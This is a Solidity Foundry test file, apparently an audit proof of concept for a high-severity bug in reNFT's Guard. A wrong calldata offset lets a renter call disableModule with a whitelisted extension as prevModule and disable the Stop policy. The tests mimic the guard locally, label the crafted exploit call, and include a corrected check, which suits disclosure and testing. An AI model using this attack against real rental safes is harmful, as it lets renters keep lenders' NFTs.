// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title ReNFT_DisableModule_PoC
 * @notice Demonstrates H-01: Guard._checkTransaction loads prevModule (offset 0x24)
 *         instead of module (offset 0x44) when checking disableModule calls.
 *         This allows a renter to disable the Stop policy module by crafting a
 *         disableModule(whitelistedExtension, stopPolicy) transaction.
 *
 * Root cause: Guard.sol line ~255-265
 *   gnosis_safe_disable_module_offset = 0x24 → loads prevModule
 *   Should be 0x44 to load module (the address being disabled)
 */
contract ReNFT_DisableModule_PoC is Test {

    // Mimics the Guard's _loadValueFromCalldata logic
    function _loadValueFromCalldata(
        bytes memory data,
        uint256 offset
    ) internal pure returns (bytes32 value) {
        assembly {
            value := mload(add(data, offset))
        }
    }

    // Mimics Guard._checkTransaction's disableModule handling
    function _guardCheckDisableModule(
        bytes memory data,
        mapping(address => bool) storage whitelistedExtensions
    ) internal view returns (address checkedAddress) {
        // BUG: offset 0x24 loads prevModule, not module
        uint256 gnosis_safe_disable_module_offset = 0x24;
        checkedAddress = address(
            uint160(
                uint256(_loadValueFromCalldata(data, gnosis_safe_disable_module_offset))
            )
        );
        require(whitelistedExtensions[checkedAddress], "not whitelisted");
    }

    // Mimics the CORRECT check (offset 0x44 → loads module)
    function _guardCheckDisableModule_FIXED(
        bytes memory data,
        mapping(address => bool) storage whitelistedExtensions
    ) internal view returns (address checkedAddress) {
        uint256 correct_offset = 0x44;
        checkedAddress = address(
            uint160(
                uint256(_loadValueFromCalldata(data, correct_offset))
            )
        );
        require(whitelistedExtensions[checkedAddress], "not whitelisted");
    }

    mapping(address => bool) public whitelistedExtensions;

    address constant WHITELISTED_EXTENSION = address(0xBEEF);
    address constant STOP_POLICY = address(0xDEAD);
    address constant RANDOM_NON_WHITELISTED = address(0xBAD);

    function setUp() public {
        whitelistedExtensions[WHITELISTED_EXTENSION] = true;
        // STOP_POLICY is NOT whitelisted (modules are not extensions)
    }

    // ----- CONTROL: Normal operation works -----

    function test_control_enableWhitelistedModule() public view {
        // enableModule(address module) — correct check: offset 0x24 = module
        // For enableModule, there is only ONE parameter, so 0x24 is correct.
        bytes memory data = abi.encodeWithSignature(
            "enableModule(address)",
            WHITELISTED_EXTENSION
        );
        // The guard loads offset 0x24 = first (and only) param = WHITELISTED_EXTENSION
        address checked = address(
            uint160(
                uint256(_loadValueFromCalldata(data, 0x24))
            )
        );
        assertEq(checked, WHITELISTED_EXTENSION, "should load whitelisted extension");
        assertTrue(whitelistedExtensions[checked], "should be whitelisted");
    }

    function test_control_disableNonWhitelistedModuleBlocked() public {
        // Attempting to disable a non-whitelisted address as prevModule should revert
        // disableModule(NON_WHITELISTED, STOP_POLICY)
        bytes memory data = abi.encodeWithSignature(
            "disableModule(address,address)",
            RANDOM_NON_WHITELISTED,  // prevModule (offset 0x24) - NOT whitelisted
            STOP_POLICY              // module (offset 0x44) - what we want to disable
        );

        // The buggy check loads prevModule = RANDOM_NON_WHITELISTED → not whitelisted → reverts
        // This appears to work correctly but for the wrong reason
        address checked = address(
            uint160(
                uint256(_loadValueFromCalldata(data, 0x24))
            )
        );
        assertFalse(whitelistedExtensions[checked], "random address not whitelisted");
    }

    // ----- EXPLOIT: Disable Stop policy by using whitelisted extension as prevModule -----

    function test_exploit_disableStopPolicyViaWrongOffset() public view {
        // Attack: call disableModule(WHITELISTED_EXTENSION, STOP_POLICY)
        // Guard only checks prevModule (offset 0x24) = WHITELISTED_EXTENSION → passes!
        // But the actual module being disabled is STOP_POLICY (offset 0x44)
        bytes memory data = abi.encodeWithSignature(
            "disableModule(address,address)",
            WHITELISTED_EXTENSION,  // prevModule at offset 0x24 → Guard checks THIS
            STOP_POLICY             // module at offset 0x44 → NOT checked by Guard
        );

        // Verify what the buggy guard checks (offset 0x24)
        address buggyChecked = address(
            uint160(uint256(_loadValueFromCalldata(data, 0x24)))
        );
        assertEq(buggyChecked, WHITELISTED_EXTENSION, "buggy check reads prevModule");
        assertTrue(
            whitelistedExtensions[buggyChecked],
            "EXPLOIT CONFIRMED: whitelisted prevModule passes guard check"
        );

        // Verify what is ACTUALLY being disabled (offset 0x44)
        address actualModule = address(
            uint160(uint256(_loadValueFromCalldata(data, 0x44)))
        );
        assertEq(actualModule, STOP_POLICY, "actual module being disabled is STOP_POLICY");
        assertFalse(
            whitelistedExtensions[actualModule],
            "STOP_POLICY is NOT whitelisted but guard never checks it"
        );

        // Conclusion: guard passes, but STOP_POLICY gets disabled
        // In a real attack: renter disables stop module → lender can never reclaim NFTs
        console.log("[EXPLOIT] disableModule(WHITELISTED, STOP_POLICY) passes guard check");
        console.log("[EXPLOIT] Guard checked  : prevModule =", buggyChecked);
        console.log("[EXPLOIT] Actually disables:", actualModule);
    }

    // ----- VERIFY: Fixed version would correctly block this -----

    function test_fixed_wouldRejectDisableStopPolicy() public {
        bytes memory data = abi.encodeWithSignature(
            "disableModule(address,address)",
            WHITELISTED_EXTENSION,  // prevModule
            STOP_POLICY             // module to disable
        );

        // Fixed guard reads offset 0x44 = STOP_POLICY → not whitelisted → reverts
        address fixedChecked = address(
            uint160(uint256(_loadValueFromCalldata(data, 0x44)))
        );
        assertEq(fixedChecked, STOP_POLICY);
        assertFalse(
            whitelistedExtensions[fixedChecked],
            "FIXED: correct offset blocks disabling STOP_POLICY"
        );
    }
}
